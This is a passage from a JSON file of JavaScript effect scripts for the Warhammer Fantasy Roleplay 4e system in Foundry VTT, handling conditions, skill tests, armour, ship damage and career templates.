\ntalents = new Array(1 + this.effect.sourceTest.result.overcast.available).fill(leaderData); // Assume any unused overcast is for war leader\nthis.actor.createEmbeddedDocuments(\"Item\", [fearData].concat(talents), {fromEffect : this.effect.id})","qSwCYMMiIHmSV1X5":"if (this.item.system.quantity.value)\n{\n\tthis.item.system.reduceQuantity();\n\tlet actor = Array.from(game.user.targets)[0]?.actor || this.actor;\n     let effectData = this.item.effects.contents[0].convertToApplied();\n\teffectData.flags.wfrp4e.sourceItem = this.item.uuid\n     effectData.duration.seconds = 10800\n\tactor.applyEffect({effectData : [effectData]})\n}\nelse\n{\n\tthis.script.scriptNotification(\"None left!\", \"error\")\n}","qT0WBPxLMMO9gvCd":"if (!this.actor.has(\"Night Vision\") && !this.actor.has(\"Night Vision\", \"talent\") && !this.actor.hasCondition(\"blinded\"))\n{\n    this.actor.addCondition(\"blinded\", 1, {\"flags.wfrp4e.nightshroud\" : true})\n}","qTcK1TSjLTi0jNQK":"let AP = args.actor.status.armour;\n\nAP[\"head\"].value += 1;\nAP[\"rArm\"].value += 1;\nAP[\"lArm\"].value += 1;\nAP[\"body\"].value += 1;\nAP[\"lLeg\"].value += 1;\nAP[\"rLeg\"].value += 1;","qUwnVlWpsmDom3RK":"args.fields.modifier -= 5;","qZschZU0nee0kJlk":"args.fields.modifier -= 30;","qaVde0sTuMBRi2nl":"return [\"NAME.Evaluate\", \"NAME.Gamble\"].map(i => game.i18n.localize(i)).includes(args.skill?.name)","qcyl98GYD55BkJsD":"this.actor.status.encumbrance.state = 0;\nthis.actor.status.encumbrance.pct = 0;","qijgjcOBCDmhglRX":"return args.skill?.name == game.i18n.localize(\"NAME.SleightOfHand\");","qjli5evn8UA9uTeZ":"return args.actor.uuid == this.effect.sourceActor.uuid;","qmOt7h17hGAKqQe0":"\nlet choice = await Dialog.wait({\n    title: this.effect.name,\n    content: `<p><strong>${this.effect.name}</strong>: Is this a ranged or magical attack that orignates outside the Dome?</p>`,\n    buttons: {\n        yes: {\n            label: \"Yes\",\n            callback: () => {\n                return true;\n            }\n        },\n        no: {\n            label: \"No\",\n            callback: () => {\n                return false;\n            }\n        }\n    }\n})\n\nif (choice)\n{\n\targs.ward = 6;\n}","qnJu82zgnfOsnqZV":"let closed = !this.item.getFlag(\"wfrp4e-soc\", \"gunport\") || false;\n\nawait this.item.setFlag(\"wfrp4e-soc\", \"gunport\", closed);\nlet scriptData = this.effect.flags.wfrp4e.scriptData;\n\nif (closed) {\n  scriptData[0].label = \"Open\";\n} else {\n  scriptData[0].label = \"Close\";\n}\n\nawait this.effect.update({\"flags.wfrp4e.scriptData\": scriptData});","qu194dVXm9Vx1TGk":"if (args.test.options.useOnesSupportive && (args.test.result.roll <= game.settings.get(\"wfrp4e\", \"automaticSuccess\") || args.test.result.roll <= args.test.target))\n{\n\nlet SL = Math.floor(args.test.target / 10) - Math.floor(args.test.result.roll / 10)\nlet ones = Number(args.test.result.roll.toString().split(\"\").pop())\n\nif (ones > SL)\n\targs.test.data.result.SL = \"+\" + (ones + args.test.successBonus + args.test.slBonus)\n   args.test.result.other.push(`<b>${this.effect.name}</b>: Used unit dice as SL`)\n}","quPcuKsq2fcild4a":"let test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {skipTargets: true, appendTitle :  ` - ${this.effect.name}`, fields: {difficulty: \"easy\"}, context: {failure : `<strong>${this.effect.name}</strong>: Vomit!`} })\nawait test.roll();\nif (test.failed)\n{\n    this.actor.addCondition(\"prone\")\n}","qxzhPtysAjPWspKf":"if (this.actor.has(\"Undead\") || this.actor.has(\"Daemonic\"))\n{\n    this.script.scriptNotification(`Cannot enter ${this.effect.name}!`);\n}","qzGPJflVW7c2Ciim":"return args.skill?.name !== game.i18n.localize(\"NAME.Cool\");","r6hi5vMdLhTaaPfb":"args.actor.details.move.value += this.effect.sourceTest.result.overcast.usage.other.current","rBAoyhzeU3Q8MVSk":"const repaired_message = `<p>Finished repairing <em>${this.item.name}</em>.</p>`;\nconst test = 'Trade (Carpenter)';\nconst difficulty = 'difficult';\nconst target = 50;\n\nconst extendedTestData = {\n  name: this.item.name,\n  type: \"extendedTest\",\n  img: this.item.img,\n  system: {\n    SL: {\n      current: 0,\n      target: target\n    },\n    test: {\n      value: test\n    },\n    completion: {\n      value: \"remove\"\n    },\n    difficulty: {\n      value: difficulty\n    }\n  },\n  effects: [\n    {\n      name: `Repair the ${this.item.name}`,\n      icon: this.item.img,\n      flags: {\n        wfrp4e: {\n          applicationData: {\n            type: \"document\",\n            documentType: \"Item\"\n          },\n          scriptData: [\n            {\n              label: this.item.name,\n              script: `\n              let id = this.item.flags.wfrp4e.fromEffect;\n              let effect = this.actor.appliedEffects.find(e => e.id === id);\n              this.script.scriptMessage(\"${repaired_message}\");\n              await effect.item.delete();\n            `,\n              trigger: \"deleteEffect\"\n            }\n          ]\n        }\n      }\n      }\n  ]\n};\n\nawait this.actor.createEmbeddedDocuments(\"Item\", [extendedTestData], {fromEffect: this.effect.id});\n","rCh3ltUrUMovd2Kc":"if (this.actor.hasCondition(\"surprised\"))\n{\n    this.script.scriptNotification(\"Cannot be surprised\");\n    this.actor.removeCondition(\"surprised\");\n}","rF0Z3hTUUnSxL3Mq":"let armour = (await fromUuid(\"Compendium.wfrp4e-core.items.VUJUZVN3VYhOaPjj\")).toObject()\nlet bite = (await fromUuid(\"Compendium.wfrp4e-core.items.pLW9SVX0TVTYPiPv\")).toObject()\nlet fear = (await fromUuid(\"Compendium.wfrp4e-core.items.pTorrE0l3VybAbtn\")).toObject()\nlet nightVision = (await fromUuid(\"Compendium.wfrp4e-core.items.FmHDbCOy3pH8yKhm\")).toObject()\nlet tracker = (await fromUuid(\"Compendium.wfrp4e-core.items.ClOlztW6hH8rslbp\")).toObject()\nlet weapon = (await fromUuid(\"Compendium.wfrp4e-core.items.AtpAudHA4ybXVlWM\")).toObject()\n\narmour.name = \"Armour (Hide)\"\narmour.system.specification.value = 2\nbite.system.specification.value = 3\nfear.system.specification.value = 2\nweapon.system.specification.value = 4\nlet items = [armour, bite, fear, nightVision, tracker, weapon]\n\n\nlet belligerent = (await fromUuid(\"Compendium.wfrp4e-core.items.GbDyBCu8ZjDp6dkj\")).toObject()//{Belligerent}\nlet bestial = (await fromUuid(\"Compendium.wfrp4e-core.items.AGcJl5rHjkyIQBPP\")).toObject()//{Bestial}\nlet big = (await fromUuid(\"Compendium.wfrp4e-core.items.a8MC97PLzl10WocT\")).toObject()//{Big}\nlet blessed = (await fromUuid(\"Compendium.wfrp4e-core.items.5muSFXd6oc760uVj\")).toObject()//{Blessed (Ulric)}\nlet champion = (await fromUuid(\"Compendium.wfrp4e-core.items.4mF5Sp3t09kZhBYc\")).toObject()//{Champion}\nlet die = (await fromUuid(\"Compendium.wfrp4e-core.items.UsJ2uIOOtHA7JqD5\")).toObject()//{Die Hard}\nlet fast = (await fromUuid(\"Compendium.wfrp4e-core.items.9MjH4xyVrd3Inzak\")).toObject()//{Fast}\nlet frenzy = (await fromUuid(\"Compendium.wfrp4e-core.items.yRhhOlt18COq4e1q\")).toObject()//{Frenzy}\nlet immunity = (await fromUuid(\"Compendium.wfrp4e-core.items.IAWyzDfC286a9MPz\")).toObject()//{Immunity to Psychology}\nlet regenerate = (await fromUuid(\"Compendium.wfrp4e-core.items.SfUUdOGjdYpr3KSR\")).toObject()//{Regenerate}\nlet size = (await fromUuid(\"Compendium.wfrp4e-core.items.8slW8CJ2oVTxeQ6q\")).toObject()//{Size (Large)}\n\nblessed.system.specification.value = \"Ulric\"\nsize.system.specification.value = \"Large\"\n\nlet optional = [belligerent, bestial, big, blessed, champion, die, fast, frenzy, immunity, regenerate, size];\n\nlet chosen = await ItemDialog.create(optional, \"unlimited\", \"Choose Optional Traits\");\n\nitems = items.concat(chosen || [])\nthis.script.scriptNotification(`Adding ${items.map(i => i.name).join(\", \")}`);\nthis.actor.createEmbeddedDocuments(\"Item\", items, {fromEffect : this.effect.id})\n","rIISfbCShejmJNKw":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.oRx92ByVNEBN6YkK\")\nlet data = item.toObject()\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id})\n","rLMaVNEGdZ6xj5Au":"return ![\"i\", \"int\", \"fel\"].includes(args.characteristic)","rRfff55c7elyvbCb":"return this.actor.flags.useless[this.item.system.location.key] && args.weapon?.system.usesHands.includes(this.item.system.location.key[0] + \"Arm\")","rUGSx06BuBvX9kgf":"if (args.test.result.charging)\n{\n   args.test.result.damage += 1\n   args.test.result.additionalDamage += 1\n   if (!args.test.result.resolute) {\n      args.test.result.breakdown.damage.other.push({label : this.effect.name, value : this.item.Advances});\n      args.test.result.resolute = true // Prevent duplicate messages\n     }\n}\n","rVRDoxiWILo7d8FF":"let specification = Number(this.item.specification.value) || 1;\nargs.actor.system.status.wounds.max += Math.floor(args.actor.system.status.wounds.max * 0.3 * specification);\nargs.actor.system.status.carries.max -= Math.floor(args.actor.system.status.carries.max * 0.1 * specification);\nargs.actor.system.details.price.gc += args.actor.system.details.price.gc * 0.2 * specification;","rVpPNILEzWL9lj6b":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.kJNAY1YRaCy9IgmT\")\nlet terrorTraitItem = item.toObject()\nterrorTraitItem.system.specification.value = Number(this.effect.item.system.specification.value) \nthis.actor.createEmbeddedDocuments(\"Item\", [terrorTraitItem]);","rX8FTinyTMj9WJri":"if (!this.actor.flags.holed) return;\nif (this.actor.flags.holed.applied === true) return;\nif (this.actor.hasCondition(\"dead\")) return;\n\nconst currentHoled = this.actor.flags.holed.holed || 0;\n\nconst openGunPorts = this.actor.itemTypes.vehicleMod.reduce((acc, m) => {\n  if (!m.name.toLowerCase().includes(\"gun port\")) \n    return acc;\n  \n  let closed = m.getFlag(\"wfrp4e-soc\", \"gunport\");\n  if (!closed) acc++;\n \n  return acc;\n}, 0);\n\nconst totalHoled = currentHoled + openGunPorts;\nconst toughness = this.actor.system.characteristics.t.value;\nthis.actor.flags.holed.total = totalHoled;\n\nif (totalHoled >= toughness) {\n  const speaker = ChatMessage.getSpeaker({actor: this.actor});\n  this.script.scriptMessage(`\n        <p><b>${speaker.alias}</b> sank due to having <em>Holed (${totalHoled})</em> rating equal to, or exceeding its <em>Toughness (${toughness })</em></p>\n        <p>\n          <em>Holed</em> due to Critical Damage: ${currentHoled}<br/>\n          <em>Holed</em> due to opened Gun Ports: ${openGunPorts}\n        </p>\n      `, {   flavor: this.effect.name.split(\"(\")[0]});\n  this.actor.addCondition(\"dead\");\n} else if (totalHoled >= (toughness * 0.5)) {\n  this.actor.system.details.move.value -= 1;\n  this.actor.system.details.man -= 1;\n  this.actor.flags.holed.half = true;\n}\n\nthis.actor.flags.holed.applied = true;","rXMylpnEtZpwou6x":"this.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {skipTargets: true, appendTitle :  ` - ${this.effect.name}`, fields: {difficulty : \"average\"}}).then(async test =>\n{\n     await test.roll()\n     if (test.failed)\n     {\n         this.actor.addCondition(\"fatigued\")    \n     }\n})","ramav4ymrDDkPKK4":"if (this.actor.hasCondition(\"bleeding\"))\n{\n    this.actor.removeCondition(\"bleeding\");\n    this.script.scriptNotification(\"Removed 1 Bleeding Condition\")\n}\nelse \n{\n    this.script.scriptNotification(\"No Bleeding Conditions\");\n}","ratP9ByLjQPiLlFK":"args.data.canReverse = true","rdaMhMyHrJjQ6vVC":"game.wfrp4e.utility.postFear(this.item.Advances, this.actor.name)","re1UFtxvRRjpPB7Z":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.nF5z1OEhpi4t6a6S\");\nlet data = item.toObject();\ndata.system.location.key = this.item.system.location.key\nif (data.system.location.key[0] == \"r\")\n{\n\tdata.system.location.value = \"Right Ankle\"\n}\nelse if (data.system.location.key[0] == \"l\")\n{\n\tdata.system.location.value = \"Left Ankle\"\n}\n\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {skipLocationValue : true, fromEffect: this.effect.id})\n","red2bt4PGgIWAdTR":"if (this.item.system.quantity.value)\n{\n\tthis.item.system.reduceQuantity();\n\tlet actor = Array.from(game.user.targets)[0]?.actor || this.actor;\n     let effectData = this.item.effects.contents[0].convertToApplied();\n     let minutes = Math.ceil(CONFIG.Dice.randomUniform() * 10) * 10;\n     effectData.duration.seconds = 60 * minutes\n     this.script.scriptMessage(`<strong>Duration</strong>: ${minutes} minutes`, {whisper : ChatMessage.getWhisperRecipients(\"GM\")})\n\tactor.applyEffect({effectData : [effectData]})\n}\nelse\n{\n\tthis.script.scriptNotification(\"None left!\", \"error\")\n}","rgSwSeB3shIMVMb6":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.x0WMGwuQzReXcQrs\")\nlet data = item.toObject();    \nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id});","rlTvhnDpj4lzfusf":"return !args.skill?.name.includes(game.i18n.localize(\"NAME.Sail\")) && args.skill?.name !== game.i18n.localize(\"NAME.Climb\");","rly9iBUy8EX7NhQT":"if (game.user.targets.size !== 1)\n  return ui.notifications.warn(\"You must target exactly one Boat.\");\n\nconst target = game.user.targets.first();\nconst vehicle = target.actor;\n\nif (!(vehicle.system instanceof VehicleModel)) \n  return ui.notifications.warn(\"You can only Constrict a Boat\");\n\nif (vehicle.size > 3)\n  return ui.notifications.warn(\"You can only Constrict vessels of Size Large or smaller\");\n\nconst turns = Math.ceil(vehicle.system.details.length.value / 10);\n\nconst mainEffect = this.item.effects.contents[0];\nconst effectData = mainEffect.toObject();\n\neffectData.statuses = [effectData.name.slugify()];\n\nfoundry.utils.setProperty(effectData, \"flags.wfrp4e.target\", target.id);\nfoundry.utils.setProperty(effectData, \"flags.wfrp4e.turns\", turns);\n\nawait this.actor.applyEffect({effectData: [effectData]});\n\nconst speaker = ChatMessage.getSpeaker({actor: this.actor});\n\nthis.script.scriptMessage(`<b>${speaker.alias}</b> started wrapping itself around the <b>${target.name}</b> and will be able to start crushing it after ${turns} turns.`);","rnioLwiJP7ps5Jwy":"if (args.item.type  == \"skill\" && args.item.name == \"Melee (Basic)\")\n{\n     args.item.system.modifier.value += 30;\n}","roKvPHDSpX4IV11C":"return !args.skill?.name.includes(game.i18n.localize(\"NAME.Perform\")) && args.characteristic != \"ag\"","rpxQU26BU7nwjtqY":"let location = this.item.system.location.key\nlet test = await this.actor.setupCharacteristic(\"dex\", {context : {failure : `<strong>${this.effect.name}</strong>: Drop the item!`}, skipTargets: true, appendTitle :  \" - \" + this.effect.name, fields : {difficulty : \"average\"}})\nawait test.roll();\n\n\nif (location && test.failed)\n{\n    let dropped = this.item.system.weaponsAtLocation;\n\n    if (dropped.length)\n    {\n        this.script.scriptNotification(`Dropped ${dropped.map(i => i.name).join(\", \")}!`)\n        for(let weapon of dropped)\n        {\n            await weapon.system.toggleEquip();\n        }\n    }\n}\n\nreturn test.succeeded","rqTT8yOyK4bUwbdm":"let test = args.test\nif (test.spell.lore.value == \"fire\")\n{\n   if (test.result.overcast.usage.target?.AoE)\n   {\n       test.result.overcast.usage.target.current += test.actor.characteristics.wp.bonus\n       test.result.overcast.usage.target.initial += test.actor.characteristics.wp.bonus\n    }\n   if (test.result.overcast.usage.range)\n   {\n       test.result.overcast.usage.range.current *= 2\n       test.result.overcast.usage.range.initial *= 2\n   }\n \n}","rr4htuVq45onXdRG":"let test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Cool\"), {appendTitle: ` - ${this.effect.name}`, fields : {difficulty : \"average\"}})\ntest.roll();","rxB1AqfVMDqTRieE":"return ![\"ws\", \"bs\", \"ag\"].includes(args.characteristic) && args.skill?.name != game.i18n.localize(\"NAME.Perception\")","s0kTuDE0qv68V2KI":"    this.actor.getActiveTokens().forEach(t => t.document.update({texture : {tint : \"#FFBF00\"}}));\n","s5bO0Sf0qpS27Tve":"await args.actor.addCondition(\"ablaze\", 3)\nawait args.actor.addCondition(\"prone\");","s6eZXfZkC1My6EXl":"let lore = this.effect.name.split(\" \")[2].toLowerCase();\nif (args.item.type == \"spell\" && args.item.system.lore.value == lore)\n{\n    args.item.system.cn.value -= 1\n}\n","s7gJQdzuM3fz2zQK":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.QluSTTTq3viHJJUh\")\nlet data = item.toObject();\ndata.system.location.value = \"Hip\"\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect: this.effect.id})\n   \nlet test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {skipTargets: true, appendTitle :  ` - ${this.effect.name}`})\nawait test.roll();\nif (test.failed)\n{\n    this.actor.addCondition(\"prone\")\n}","s8idWt9YdMTRfnjV":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.BqPZn6q3VHn9HUrW\")\nlet data = item.toObject();\ndata.system.specification.value = 4 - this.actor.characteristics.s.bonus\ndata.name = item.name.replace(\"(Feature)\", \"\");\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id})","s8xU6OOZbbfo6VIw":"args.fields.slBonus += this.actor.system.characteristics.ag.bonus\n","s94yKZ4o5XN4JWM1":"// Any attack with such ammunition which inflicts at least one Wound,\n// also inflicts one Bleeding Condition.\n\nif (args.totalWoundLoss > 0) {\n  args.actor.addCondition(\"bleeding\")\n}\n","sAVpm7hFRHpbCLXm":"return [\"ws\", \"bs\", \"s\",  \"t\", \"ag\", \"i\"].includes(args.characteristic)","sB4KB9bT3nQhAoqG":"// This script needs to be separate because equipTransfer is off on the other effect, and thus won't execute when added to an actor\n\nlet mainEffect = this.item.effects.contents[0];\nif (mainEffect.name.includes(\"<Lore>\"))\n{\n    let choice = await ItemDialog.create(ItemDialog.objectToArray(game.wfrp4e.config.magicLores, this.item.img), 1, \"Choose Lore\");\n    if (choice.length)\n    {\n        mainEffect.update({name : mainEffect.name.replace(\"<Lore>\", choice[0].name)})\n        this.item.update({name : this.item.name += ` (${choice[0].name})`})\n    }\n}\n\nthis.effect.delete();","sHVLKIdPbzLVItCa":"if (args.actorsystem.details.move.oars.value > 0)\n  args.actor.system.details.move.oars.value -= 1;","sHfkTRqTWPg2JAGN":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.Item.JQa5DLnTs2SEzRrc\")\nthis.actor.createEmbeddedDocuments(\"Item\", [item], {fromEffect : this.effect.id})","sKO8TcLIkCTnFvXu":"args.abort = true;\nthis.script.scriptNotification(`Cannot use ${this.item.system.location.value}!`, \"error\")","sNSfDBIA2k17hPYI":"let ablaze = this.actor.hasCondition(\"ablaze\");\nif (ablaze)\n{\n\tablaze?.delete();\n\tthis.script.scriptNotification(\"Ignore Ablaze\");\n}\n","sQDh3g11pWchxpW9":"return true","sSMg43ZjnNmpytfj":"let test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Cool\"), {skipTargets: true, appendTitle :  \" - \" + this.effect.name});\nawait test.roll();\n","sUHuj00IpoZ7Gd03":"return args.skill?.name != game.i18n.localize(\"NAME.Swim\");","sWyO1DNaqb2EdHoW":"if (!this.actor.items.getName(game.i18n.localize(\"NAME.Frenzy\"))) // Either frenzy trait or psychology\n{\n  // Add Frenzy psychology\n  let item = await fromUuid(\"Compendium.wfrp4e-core.items.DrNUTPeodEgpWTnT\")\n  let data = item.toObject();\n  data.effects[0].disabled = false;\n  this.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect: this.effect.id})\n}\n\nthis.script.scriptMessage(`<p><strong>By imbibing this potion, ${this.actor.prototypeToken.name}</strong> has becomes subject to Frenzy. This Frenzy lasts [[1d10]] Rounds, and may not be ended sooner.</p>`, \n  {whisper: ChatMessage.getWhisperRecipients(\"GM\"), blind: true })   ","sYlGRLApZ3Ub24ea":"this.actor.system.status.addArmour(3, {source: this.effect.name, magical: true})","sZwLitzwKBTaFca3":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.Item.5hH73j2NgPdsLCZN\")\nlet data = item.toObject();\ndata.name = data.name.replace(\"Target\", \"Greenskins, Undead, Chaos\")\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id})","sagKJM6oDFlw4ED2":"let test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Cool\"), {skipTargets: true, appendTitle :  ` - ${this.effect.name}`});\nawait test.roll();\nreturn test.failed;","sbK1a7txpSoXFzyB":"if (args.test.options.useOnesArgumentative && (args.test.result.roll <= game.settings.get(\"wfrp4e\", \"automaticSuccess\") || args.test.result.roll <= args.test.target))\n{\n\nlet SL = Math.floor(args.test.target / 10) - Math.floor(args.test.result.roll / 10)\nlet ones = Number(args.test.result.roll.toString().split(\"\").pop())\n\nif (ones > SL)\n\targs.test.data.result.SL = \"+\" + (ones + args.test.successBonus + args.test.slBonus)\n   args.test.result.other.push(`<b>${this.effect.name}</b>: Used unit dice as SL`)\n}","scfm5iWWBxWI6QaK":"let darkvision = await fromUuid(\"Compendium.wfrp4e-core.items.Item.JQa5DLnTs2SEzRrc\")\nlet fear = await fromUuid(\"Compendium.wfrp4e-core.items.Item.pTorrE0l3VybAbtn\")\nlet acutesense = await fromUuid(\"Compendium.wfrp4e-core.items.Item.9h82z72XGo9tfgQS\")\nfear = fear.toObject();\nfear.system.specification.value = 1;\nthis.actor.createEmbeddedDocuments(\"Item\", [darkvision, fear, acutesense], {fromEffect : this.effect.id})","sgS9rblPkQB36C8S":"if (this.item.name.includes(\"(\"))\n{\n\tlet trade = this.item.parenthesesText;\n\tif (trade?.toLowerCase() != \"any\")\n\t    return this.item.updateSource({\"system.tests.value\" : this.item.system.tests.value.replace(\"any one\", trade)})\n}\n\nlet index = game.packs\n.filter(i => i.metadata.type == \"Item\")\n.reduce((acc, pack) => acc.concat(pack.index.contents), [])\n.filter(i => i.type == \"skill\" && i.name.includes(game.i18n.localize(\"NAME.Trade\")))\n.map(i => {\n\ti.id = i._id\n\treturn i\n})\n\nlet choice = await ItemDialog.create(index, 1, \"Choose a Trade Skill\")\nlet text;\nif (!choice[0])\n{\n    let custom = await ValueDialog.create(\"Enter Custom Trade Skill\", \"Custom Trade\");  \n    text = custom || \"\"\n}\nelse \n{\n    text = game.wfrp4e.utility.extractParenthesesText(choice[0].name)\n}\n\nawait this.item.updateSource({name : this.item.name.replace(\"(Any)\", \"\").replace(\"(any)\", \"\").trim() + ` (${text})`, \"system.tests.value\" : this.item.system.tests.value.replace(\"any one\", text)});","shkBUtUuMPDKvFm7":"let test = await this.actor.setupSkill(\"Dodge\", {fields : {difficulty : \"average\"}})\nlet caster = this.effect.sourceActor\n\nlet fallen = this.effect.sourceTest.result.SL + caster.characteristics.wp.bonus\nawait test.roll();\nif (test.failed)\n{\n    this.actor.addCondition(\"prone\")\n   this.script.scriptMessage(`<b>${this.actor.prototypeToken.name}</b> falls ${fallen} yards`)\n}","skVq3eDEYKFF2iZp":"// I'm assuming the endurance test specified is for the end-round check\nawait this.actor.addCondition(\"poisoned\", 4);\n","sm9d5lk6cM0OuUkf":"this.actor.applyFear(Math.min(4, this.effect.sourceTest.result.overcast.usage.other.current))","svCqdytEOtqFXCcs":"let characteristics = {\n    \"ws\" : 0,\n    \"bs\" : 0,\n    \"s\" : 0,\n    \"t\" : 10,\n    \"i\" : 15,\n    \"ag\" : 0,\n    \"dex\" : 10,\n    \"int\" : 20,\n    \"wp\" : 20,\n    \"fel\" : 10\n}\nlet skills = [\"Channelling\", \"Cool\", \"Dodge\", \"Entertain (Storytelling)\", \"Intuition\", \"Language (Magick)\", \"Lore (Magic)\", \"Perception\"]\nlet skillAdvancements = [5, 15, 10, 10, 15, 10, 10, 20]\n\nlet talents = [\"Arcane Magic\", \"Petty Magic\", \"Second Sight\"]\nlet trappings = [\"Hand Weapon\", \"Robes\", \"Quarterstaff\"]\nlet specialItems = [ \n    {name: \"Magic Item\", type: \"trapping\", trappingType: \"misc\" }, \n]    \nlet items = [];\n\nlet updateObj = this.actor.toObject();\n\nfor (let ch in characteristics)\n{\n    updateObj.system.characteristics[ch].modifier += characteristics[ch];\n}\n\nfor (let item of specialItems) {\n    let newItem\n    if (item.type == \"weapon\") {\n        newItem = new ItemWfrp4e({ name: item.name, type: item.type, system: { equipped: true, damage: {value: item.damage}}  })\n    } else if (item.type == \"trapping\") {\n        newItem = new ItemWfrp4e({ img: \"systems/wfrp4e/icons/blank.png\", name: item.name, type: item.type, system: { worn: true, trappingType: { value: item.trappingType}  } } )\n    } else {\n        newItem = new ItemWfrp4e({ img: \"systems/wfrp4e/icons/blank.png\", name: item.name, type: item.type  })\n    }\n    items.push(newItem.toObject())\n}\n\nfor (let index = 0; index < skills.length; index++)\n{\n    let skill = skills[index]\n    let skillItem;\n    skillItem = updateObj.items.find(i => i.name == skill && i.type == \"skill\")\n    if (skillItem)\n        skillItem.system.advances.value += skillAdvancements[index]\n    else \n    {\n        skillItem = await game.wfrp4e.utility.findSkill(skill)\n        skillItem = skillItem.toObject();\n        skillItem.system.advances.value = skillAdvancements[index];\n        items.push(skillItem);\n    }\n}\n\nfor (let talent of talents)\n{\n    let talentItem = await game.wfrp4e.utility.findTalent(talent)\n    if (talentItem)\n    {\n        items.push(talentItem.toObject());\n    }\n    else \n    {\n        ui.notifications.warn(`Could not find ${talent}`, {permanent : true})\n    }\n}\n\nfor (let trapping of trappings) \n{\n    let trappingItem = await game.wfrp4e.utility.findItem(trapping)\n    if (trappingItem)\n    {\n        trappingItem = trappingItem.toObject()\n\n        equip(trappingItem)\n\n        items.push(trappingItem);\n    }\n    else \n    {\n        ui.notifications.warn(`Could not find ${trapping}`, {permanent : true})\n    }\n}\n\nlet ride = await Dialog.confirm({title : \"Skill\", content : \"Add Chaos Steed and +20 Ride (Horse)?\"})\n\nif (ride)\n{\n    let skill = await game.wfrp4e.utility.findSkill(\"Ride (Horse)\")\n    skill = skill.toObject();\n    skill.system.advances.value = 20;\n    items = items.concat({name : \"Chaos Steed\", type: \"trapping\", \"system.trappingType.value\" : \"misc\"}, skill)\n}\n\n\nupdateObj.name = updateObj.name += \" \" + this.effect.name\n\nawait this.actor.update(updateObj)\nthis.actor.createEmbeddedDocuments(\"Item\", items);\n\nfunction equip(item)\n{\n    if (item.type == \"armour\")\n        item.system.worn.value = true\n    else if (item.type == \"weapon\")\n        item.system.equipped = true\n    else if (item.type == \"trapping\" && item.system.trappingType.value == \"clothingAccessories\")\n        item.system.worn = true\n}","sx7Ikn8WW00gBFb4":"let location = (Math.ceil(CONFIG.Dice.randomUniform() * 2) == 2 ? \"r\" : \"l\") + \"Arm\"\n\nif (location == \"lArm\")\n{\n\tthis.script.scriptNotification(\"Rolled Left\")\n}\nelse if (location == \"rArm\")\n{\n\tthis.script.scriptNotification(\"Rolled Right\")\n}\n\nthis.effect.updateSource({\"flags.wfrp4e.location\" : location});\n\nif (location)\n{\n    let dropped = this.actor.itemTypes.weapon.filter(i => i.isEquipped & i.system.usesHands.includes(location));\n\n    if (dropped.length)\n    {\n        this.script.scriptNotification(`Dropped ${dropped.map(i => i.name).join(\", \")}!`)\n        for(let weapon of dropped)\n        {\n            await weapon.system.toggleEquip();\n        }\n    }\n}\n\nlet roll = await new Roll(\"1d10\").roll()\n\nroll.toMessage(this.script.getChatData({flavor : `${this.effect.name} (Duration)`}));\n\nthis.effect.updateSource({\"duration.rounds\" : roll.total})","syBgPp7rOymCZejX":"let test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {skipTargets: true, appendTitle :  ` - ${this.effect.name}`})\nawait test.roll();\nif (test.failed)\n{\n    this.actor.addCondition(\"stunned\")\n}","syqqBkyP5tGqZ78t":"this.actor.has(\"Immunity to Psychology\")?.delete();\n\nlet roll = await new Roll(\"1d10\").roll();\n\nroll.toMessage(this.script.getChatData());\n\nthis.script.scriptNotification(`Removed Immunity to Psychology, Adding ${roll.total} Broken Conditions`)\nthis.actor.addCondition(\"broken\", roll.total, {\"flags.wfrp4e.blasted-mind\" : true})","sz0PqS1kroMOzUZk":"let characteristics = {\n    \"ws\" : -15,\n    \"bs\" : -30,\n    \"s\" : 0,\n    \"t\" : 0,\n    \"i\" : -10,\n    \"ag\" : -10,\n    \"dex\" : 0,\n    \"int\" : -20,\n    \"wp\" : 15,\n    \"fel\" : -20\n}\nlet skills = [\"Melee (Brawling)\"]\nlet skillAdvancements = [10]\n\nlet talents = [\"Fearless (Everything)\", \"Frenzy\", \"Implacable\"]\nlet trappings = [\"Plate Breastplate\", \"Plate Bracers\", \"Plate Helm\", \"Plate Leggings\"]\nlet specialItems = []    \nlet items = [];\n\nlet updateObj = this.actor.toObject();\n\nfor (let ch in characteristics)\n{\n    updateObj.system.characteristics[ch].modifier += characteristics[ch];\n}\n\nfor (let item of specialItems) {\n    let newItem\n    if (item.type == \"weapon\") {\n        newItem = new ItemWfrp4e({ name: item.name, type: item.type, system: { equipped: true, damage: {value: item.damage}}  })\n    } else if (item.type == \"trapping\") {\n        newItem = new ItemWfrp4e({ img: \"systems/wfrp4e/icons/blank.png\", name: item.name, type: item.type, system: { worn: true, trappingType: { value: item.trappingType}  } } )\n    } else {\n        newItem = new ItemWfrp4e({ img: \"systems/wfrp4e/icons/blank.png\", name: item.name, type: item.type  })\n    }\n    items.push(newItem.toObject())\n}\n\nfor (let index = 0; index < skills.length; index++)\n{\n    let skill = skills[index]\n    let skillItem;\n    skillItem = updateObj.items.find(i => i.name == skill && i.type == \"skill\")\n    if (skillItem)\n        skillItem.system.advances.value += skillAdvancements[index]\n    else \n    {\n        skillItem = await game.wfrp4e.utility.findSkill(skill)\n        skillItem = skillItem.toObject();\n        skillItem.system.advances.value = skillAdvancements[index];\n        items.push(skillItem);\n    }\n}\n\nfor (let talent of talents)\n{\n    let talentItem = await game.wfrp4e.utility.findTalent(talent)\n    if 